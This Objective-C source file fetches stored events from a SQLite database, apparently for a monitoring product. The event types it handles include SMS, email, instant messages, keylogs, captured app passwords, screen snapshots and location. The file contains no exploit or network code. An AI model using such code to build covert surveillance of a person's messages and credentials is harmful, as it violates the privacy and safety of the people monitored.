//
//  RegularEventFetcher.m
//  EventRepos
//
//  Created by Makara Khloth on 9/26/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "RegularEventFetcher.h"
#import "DatabaseManager.h"
#import "EventQueryPriority.h"
#import "QueryCriteria.h"

#import "FxEventEnums.h"
#import "FxSmsEvent.h"
#import "FxMmsEvent.h"
#import "FxEmailEvent.h"
#import "FxIMEvent.h"
#import "FxRecipientWrapper.h"
#import "FxRecipient.h"
#import	"FxAttachmentWrapper.h"
#import "FxAttachment.h"
#import "FxBookmarkWrapper.h"
#import "FxBookmarkEvent.h"
#import "FxIMMessageEvent.h"
#import "FxIMConversationEvent.h"
#import "FxPasswordEvent.h"
#import "FxEmailMacOSEvent.h"

#import "DAOFactory.h"
#import "RecipientDAO.h"
#import "AttachmentDAO.h"
#import "BookmarkDAO.h"
#import "IMMessageAttachmentDAO.h"
#import "IMConversationContactDAO.h"
#import "AppPasswordDAO.h"

#import "ArrayUtils.h"

@implementation RegularEventFetcher

- (id) initWithDBManager: (DatabaseManager*) aDBManager withEventQueryPriority: (EventQueryPriority*) aQueryPriority andQueryCriteria: (QueryCriteria*) aCriteria {
	if ((self = [super init])) {
		mDBManager = aDBManager;
		mQueryPriority = aQueryPriority;
		[mQueryPriority retain];
		mQueryCriteria = aCriteria;
		[mQueryCriteria retain];
	}
	return (self);
}

- (NSArray*) fetchRegularEvent: (NSNumber**) aEventType {
	// Max number of event to select
	NSInteger remain = [mQueryCriteria mMaxEvent];
	NSMutableArray* fetchedEvent = [[NSMutableArray alloc] init];
	for (NSNumber* number in [mQueryPriority selectPriority]) {
		NSArray* eventArray = nil;
		FxEventType eventType = (FxEventType)[number intValue];
		
		// Event to select
		if (![mQueryCriteria isEventTypeExist:eventType]) {
			continue;
		}
		
		// On return get event type (table id) to the caller
		if (*aEventType) { // Defensive purpose
			[*aEventType release];
		}
		*aEventType = [[NSNumber alloc] initWithInt:eventType]; // Caller (DatabaseOperationAssistant) need to release this object
		
		id <DataAccessObject> dao = [DAOFactory dataAccessObject:eventType withSqlite3:[mDBManager sqlite3db]];
		switch (eventType) {
			case kEventTypeLocation:
			case kEventTypeCallLog:
			case kEventTypeSystem:
			case kEventTypeSettings:
			case kEventTypePanic:
			case kEventTypeBrowserURL:
			case kEventTypeApplicationLifeCycle:
			case kEventTypeIMAccount:
			case kEventTypeIMContact:
			case kEventTypeVoIP: 
			case kEventTypeKeyLog:
            case kEventTypePageVisited:
            case kEventTypeUsbConnection:
            case kEventTypeFileTransfer:
            case kEventTypeLogon:
            case kEventTypeAppUsage:
            case kEventTypeIMMacOS:
            case kEventTypeScreenRecordSnapshot:
            case kEventTypeFileActivity:
            case kEventTypeNetworkTraffic:
            case kEventTypeNetworkConnectionMacOS:
            case kEventTypePrintJob: {
				eventArray = [dao selectMaxEvent:remain];
				// Check order
				if ([mQueryCriteria mQueryOrder] == kQueryOrderNewestFirst) {
					eventArray = [ArrayUtils reverseArray:eventArray];
				}
			} break;
			case kEventTypeSms: {
				eventArray = [dao selectMaxEvent:remain];
				
				// Check order
				if ([mQueryCriteria mQueryOrder] == kQueryOrderNewestFirst) {
					eventArray = [ArrayUtils reverseArray:eventArray];
				}
				
				// Recipient
				RecipientDAO* recipDAO = [[RecipientDAO alloc] initWithSqlite3:[mDBManager sqlite3db]];
				for (FxSmsEvent* event in eventArray) {
					NSArray* recipientArray = [recipDAO selectRow:[event eventId] andEventType:eventType];
					for (FxRecipientWrapper* wrapper in recipientArray) {
						[event addRecipient:[wrapper recipient]];
					}
				}
				[recipDAO release];
			} break;
			case kEventTypeMail: {
				eventArray = [dao selectMaxEvent:remain];
				
				// Check order
				if ([mQueryCriteria mQueryOrder] == kQueryOrderNewestFirst) {
					eventArray = [ArrayUtils reverseArray:eventArray];
				}
				
				// Recipient and attachment
				RecipientDAO* recipDAO = [[RecipientDAO alloc] initWithSqlite3:[mDBManager sqlite3db]];
				AttachmentDAO* attDAO = [[AttachmentDAO alloc] initWithSqlite3:[mDBManager sqlite3db]];
				for (FxEmailEvent* event in eventArray) {
					NSArray* recipientArray = [recipDAO selectRow:[event eventId] andEventType:eventType];
					for (FxRecipientWrapper* wrapper in recipientArray) {
						[event addRecipient:[wrapper recipient]];
					}
					
					NSArray* attArray = [attDAO selectRow:[event eventId] andEventType:eventType];
					for (FxAttachmentWrapper* wrapper in attArray) {
						[event addAttachment:[wrapper attachment]];
					}
				}
				[recipDAO release];
				[attDAO release];
			} break;
			case kEventTypeMms: {
				eventArray = [dao selectMaxEvent:remain];
				
				// Check order
				if ([mQueryCriteria mQueryOrder] == kQueryOrderNewestFirst) {
					eventArray = [ArrayUtils reverseArray:eventArray];
				}
				
				// Recipient and attachment
				RecipientDAO* recipDAO = [[RecipientDAO alloc] initWithSqlite3:[mDBManager sqlite3db]];
				AttachmentDAO* attDAO = [[AttachmentDAO alloc] initWithSqlite3:[mDBManager sqlite3db]];
				for (FxMmsEvent* event in eventArray) {
					NSArray* recipientArray = [recipDAO selectRow:[event eventId] andEventType:eventType];
					for (FxRecipientWrapper* wrapper in recipientArray) {
						[event addRecipient:[wrapper recipient]];
					}
					
					NSArray* attArray = [attDAO selectRow:[event eventId] andEventType:eventType];
					for (FxAttachmentWrapper* wrapper in attArray) {
						[event addAttachment:[wrapper attachment]];
					}
				}
				[recipDAO release];
				[attDAO release];
			} break;
			case kEventTypeIM: {
				eventArray = [dao selectMaxEvent:remain];
				
				// Check order
				if ([mQueryCriteria mQueryOrder] == kQueryOrderNewestFirst) {
					eventArray = [ArrayUtils reverseArray:eventArray];
				}
				
				// Recipient and attachment
				RecipientDAO* recipDAO = [[RecipientDAO alloc] initWithSqlite3:[mDBManager sqlite3db]];
				AttachmentDAO* attDAO = [[AttachmentDAO alloc] initWithSqlite3:[mDBManager sqlite3db]];
				for (FxIMEvent* event in eventArray) {
					NSArray* participantsWrapper = [recipDAO selectRow:[event eventId] andEventType:eventType];
					NSMutableArray *participants = [NSMutableArray array];
					for (FxRecipientWrapper* wrapper in participantsWrapper) {
						[participants addObject:[wrapper recipient]];
					}
					[event setMParticipants:participants];
					
					NSArray* attArray = [attDAO selectRow:[event eventId] andEventType:eventType];
					NSMutableArray *attachments = [NSMutableArray array];
					for (FxAttachmentWrapper* wrapper in attArray) {
						[attachments addObject:[wrapper attachment]];
					}
					[event setMAttachments:attachments];
				}
				[recipDAO release];
				[attDAO release];
			} break;
			case kEventTypeBookmark: {
				eventArray = [dao selectMaxEvent:remain];
				
				// Check order
				if ([mQueryCriteria mQueryOrder] == kQueryOrderNewestFirst) {
					eventArray = [ArrayUtils reverseArray:eventArray];
				}
				
				BookmarkDAO *bookmarkDAO = [[BookmarkDAO alloc] initWithSqlite3:[mDBManager sqlite3db]];
				for (FxBookmarkEvent *event in eventArray) {
					NSArray *bookmarkWs = [bookmarkDAO selectRow:[event eventId] andEventType:eventType];
					for (FxBookmarkWrapper *bookmarkW in bookmarkWs) {
						[event addBookmark:[bookmarkW mBookmark]];
					}
				}
				[bookmarkDAO release];
			} break;
			case kEventTypeIMMessage: {
				eventArray = [dao selectMaxEvent:remain];
				// Check order
				if ([mQueryCriteria mQueryOrder] == kQueryOrderNewestFirst) {
					eventArray = [ArrayUtils reverseArray:eventArray];
				}
				IMMessageAttachmentDAO *imMessageAttachmentDAO = [[IMMessageAttachmentDAO alloc] initWithSqlite3:[mDBManager sqlite3db]];
				for (FxIMMessageEvent *event in eventArray) {
					NSMutableArray *atts = [NSMutableArray arrayWithCapacity:2];
					NSArray *attachmentWrappers = [imMessageAttachmentDAO selectRowWithIMMessageID:[event eventId]];
					for (FxAttachmentWrapper *att in attachmentWrappers) {
						[atts addObject:[att attachment]];
					}
					[event setMAttachments:atts];
				}
				[imMessageAttachmentDAO release];
			} break;
			case kEventTypeIMConversation: {
				eventArray = [dao selectMaxEvent:remain];
				// Check order
				if ([mQueryCriteria mQueryOrder] == kQueryOrderNewestFirst) {
					eventArray = [ArrayUtils reverseArray:eventArray];
				}
				IMConversationContactDAO *imConvsContactDAO = [[IMConversationContactDAO alloc] initWithSqlite3:[mDBManager sqlite3db]];
				for (FxIMConversationEvent *event in eventArray) {
					NSMutableArray *contactIDs = [NSMutableArray arrayWithCapacity:2];
					NSArray *arrayRowInfo = [imConvsContactDAO selectRowWithIMConversationID:[event eventId]];
					for (NSDictionary *rowInfo in arrayRowInfo) {
						NSString *conversationContact = [rowInfo objectForKey:@"im_conversation_contact_id"];
						[contactIDs addObject:conversationContact];
					}
					[event setMContactIDs:contactIDs];
				}
				[imConvsContactDAO release];
			} break;
            case kEventTypePassword: {
				eventArray = [dao selectMaxEvent:remain];
				// Check order
				if ([mQueryCriteria mQueryOrder] == kQueryOrderNewestFirst) {
					eventArray = [ArrayUtils reverseArray:eventArray];
				}
				AppPasswordDAO *appPwdDAO = [[AppPasswordDAO alloc] initWithSQLite3:[mDBManager sqlite3db]];
				for (FxPasswordEvent *event in eventArray) {
					NSArray *appPwds = nil;
                    if ([appPwdDAO respondsToSelector:@selector(selectRows:)]) {
                        appPwds = [appPwdDAO selectRows:[event eventId]];
                    }
					[event setMAppPwds:appPwds];
				}
				[appPwdDAO release];
			} break;
            case kEventTypeEmailMacOS: {
                eventArray = [dao selectMaxEvent:remain];
                
                // Check order
                if ([mQueryCriteria mQueryOrder] == kQueryOrderNewestFirst) {
                    eventArray = [ArrayUtils reverseArray:eventArray];
                }
                
                // Recipient and attachment
                RecipientDAO* recipDAO = [[RecipientDAO alloc] initWithSqlite3:[mDBManager sqlite3db]];
                AttachmentDAO* attDAO = [[AttachmentDAO alloc] initWithSqlite3:[mDBManager sqlite3db]];
                for (FxEmailMacOSEvent* event in eventArray) {
                    NSMutableArray *recipients = [NSMutableArray array];
                    NSArray* recipientArray = [recipDAO selectRow:[event eventId] andEventType:eventType];
                    for (FxRecipientWrapper* wrapper in recipientArray) {
                        [recipients addObject:[wrapper recipient]];
                    }
                    [event setMRecipients:recipients];
                    
                    NSMutableArray *attachments = [NSMutableArray array];
                    NSArray* attArray = [attDAO selectRow:[event eventId] andEventType:eventType];
                    for (FxAttachmentWrapper* wrapper in attArray) {
                        [attachments addObject:[wrapper attachment]];
                    }
                    [event setMAttachments:attachments];
                }
                [recipDAO release];
                [attDAO release];
            } break;
			default: {
			} break;
		}
			
		// Copy event
		for (FxEvent* event in eventArray) {
			[fetchedEvent addObject:event];
			remain--;
			if (remain <= 0) {
				break;
			}
		}
		
		// Break outer loop
		if (remain <= 0) {
			break;
		}
	}
	[fetchedEvent autorelease];
	return (fetchedEvent);
}

- (void) dealloc {
	[mQueryPriority release];
	[mQueryCriteria release];
	[super dealloc];
}

@end
